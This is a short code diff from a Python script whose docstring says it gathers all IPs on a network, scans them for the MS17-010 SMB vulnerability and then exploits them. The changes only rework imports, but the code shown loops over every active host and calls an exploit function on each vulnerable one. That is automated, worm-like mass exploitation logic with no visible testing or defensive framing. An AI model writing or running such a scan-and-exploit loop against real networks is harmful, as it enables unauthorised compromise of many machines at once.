@@ -3,8 +3,8 @@ Get all the Possible IPs in the network, scan for MS17 them, then exploit.
 
 """
 
-from MS17_010 import checker
-from MS17_010 import zzz_exploit
+from checker import *
+from zzz_exploit import *
 
 
 import subprocess
@@ -72,8 +72,8 @@ def getAllActiveHosts():
 
 def scan_for_ms17010():
     for ip in allActiveHosts:
-        if checker.check(ip):
-            zzz_exploit.exploit(ip,None)
+        if check(ip):
+            exploit(ip,None)
             print(ip)
         else:
             print("NOPE")
